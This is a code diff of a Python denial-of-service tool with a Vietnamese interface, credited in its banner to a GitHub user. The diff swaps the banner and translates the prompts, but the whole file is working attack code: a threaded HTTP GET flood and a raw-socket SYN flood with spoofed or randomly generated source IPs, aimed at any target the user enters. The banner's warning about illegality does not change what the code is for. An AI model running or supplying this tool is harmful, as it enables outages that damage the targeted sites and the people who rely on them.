@@ -1,48 +1,71 @@
+from platform import system
+import os
+import time
+import random
+import socket
+from urllib import request
+import sys
+import threading
 from requests import get as requests_get
 from time import localtime, strftime
-import threading
-import socket as sock_module
-import random
 from struct import pack
 from socket import AF_INET, SOCK_RAW, IPPROTO_TCP, IP_HDRINCL, inet_aton, htons
 from random import randint
+import colorama
+from colorama import Fore, Back, Style
+from tqdm.auto import tqdm
 
-def print_banner():
-    print("\n██████╗░░█████╗░░██████╗████████╗██████╗░░█████╗░")
-    print("██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗")
-    print("██║░░██║██║░░██║╚█████╗░░░░██║░░░██████╔╝███████║")
-    print("██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║")
-    print("██████╔╝╚█████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║")
-    print("╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝")
-    print("-------------------------------------------------")
-    print("   ----| DDoS Attack _ GitHub:@dhungx    |----   ")
-    print("-------------------------------------------------\n\n")
-    
-    print("HÃY CẨN TRỌNG TRƯỚC KHI SỬ DỤNG VÌ VIỆC BẠN SẮP LÀM CÓ THỂ LÀ MỘT ĐIỀU PHẠM PHÁP")
-    print("ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC)")
+colorama.init()
+
+def clearConsole():
+    command = 'clear'
+    if os.name in ('nt', 'dos'):
+        command = 'cls'
+    os.system(command)
+
+def banner():
+    clearConsole()
+    print(Fore.RED + '''
+         __     _____ ____   ___  ____ ____    ____ _____ _   _ ____ ___ ___  
+ \ \   / /_ _| __ ) / _ \/ ___/ ___|  / ___|_   _| | | |  _ \_ _/ _ \ 
+  \ \ / / | ||  _ \| | | \___ \___ \  \___ \ | | | | | | | | | | | | |
+   \ V /  | || |_) | |_| |___) |__) |  ___) || | | |_| | |_| | | |_| |
+    \_/  |___|____/ \___/|____/____/  |____/ |_|  \___/|____/___\___/ 
+                                                                      
+
+        -------------------------------------------------
+           ----| DDoS Attack _ GitHub:@dhungx    |----   
+        -------------------------------------------------
+        ''' + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT +
+        '''
+        HÃY CẨN TRỌNG TRƯỚC KHI SỬ DỤNG VÌ VIỆC BẠN SẮP LÀM CÓ THỂ LÀ MỘT ĐIỀU PHẠM PHÁP
+        ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC)
+        ''' + Style.RESET_ALL + Fore.MAGENTA + Style.BRIGHT + '''
+        by: b i y i v i
+        ''' + Style.RESET_ALL)
 
 def http_get_flood(target, packet_size):
     count = 0
     if packet_size == "u":
-        print("===== The HTTP GET Flood attack started :)")
+        print("===== Tấn công HTTP GET Flood bắt đầu :)")
         while True:
-            named_tuple = localtime()  # get struct_time
+            named_tuple = localtime()
             time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
             r = requests_get("http://" + target)
-            print(f"[{time_string}] Packet was sent ({count})")
+            print(f"[{time_string}] Gói tin đã gửi ({count})")
             count += 1
     elif int(packet_size) >= 1:
-        print("===== The HTTP GET Flood attack started :)")
+        print("===== Tấn công HTTP GET Flood bắt đầu :)")
         while count <= int(packet_size):
-            named_tuple = localtime()  # get struct_time
+            named_tuple = localtime()
             time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
             r = requests_get("http://" + target)
-            print(f"[{time_string}] Packet was sent ({count})")
+            print(f"[{time_string}] Gói tin đã gửi ({count})")
             count += 1
-        print("HTTP GET Flood attack finished!")
+        print("HTTP GET Flood tấn công kết thúc!")
     else:
-        print("Error: Please enter the correct number of packets.")
-        print("Note: The program closes automatically after 5 seconds!")
+        print("Lỗi: Vui lòng nhập đúng số lượng gói tin.")
+        print("Lưu ý: Chương trình sẽ tự động đóng sau 5 giây!")
 
 def checksum(psh):
     s = 0
@@ -54,7 +77,7 @@ def checksum(psh):
     return s
 
 def syn_flood(target_ip, fake_ip):
-    sock = sock_module.socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+    sock = socket.socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
     sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
     
     while True:
@@ -74,29 +97,29 @@ def syn_flood(target_ip, fake_ip):
         sock.sendto(packet, (target_ip, 0))
 
 def main():
-    print_banner()
+    banner()
     
-    target = input("-- Target URL: ")
-    packet_size = input("-- Packet Size (\"u\" = unlimited): ")
-    fake_ip = input("-- Fake IP (or leave empty for auto-generate): ") or '.'.join([str(randint(0, 255)) for _ in range(4)])
+    target = input("-- Nhập URL mục tiêu: ")
+    packet_size = input("-- Số lượng gói tin (\"u\" = không giới hạn): ")
+    fake_ip = input("-- Nhập IP giả mạo (hoặc để trống để tự động tạo): ") or '.'.join([str(randint(0, 255)) for _ in range(4)])
     
-    # Get number of threads for each attack type
-    http_threads_count = int(input("-- Number of HTTP GET Flood threads: "))
-    syn_threads_count = int(input("-- Number of SYN Flood threads: "))
+    # Nhập số lượng luồng cho mỗi loại tấn công
+    http_threads_count = int(input("-- Số lượng luồng HTTP GET Flood: "))
+    syn_threads_count = int(input("-- Số lượng luồng SYN Flood: "))
     
     if target.startswith("http://"):
         target = target[7:]
     elif target.startswith("https://"):
         target = target[8:]
     
-    # Check target
+    # Kiểm tra mục tiêu
     try:
         requests_get("http://" + target)
     except:
-        print("Error: Invalid site address.")
+        print("Lỗi: Địa chỉ trang web không hợp lệ.")
         return
     
-    # Start HTTP GET Flood and SYN Flood attacks with specified number of threads
+    # Bắt đầu các cuộc tấn công HTTP GET Flood và SYN Flood với số lượng luồng đã chỉ định
     http_threads = []
     for _ in range(http_threads_count):
         http_thread = threading.Thread(target=http_get_flood, args=(target, packet_size))
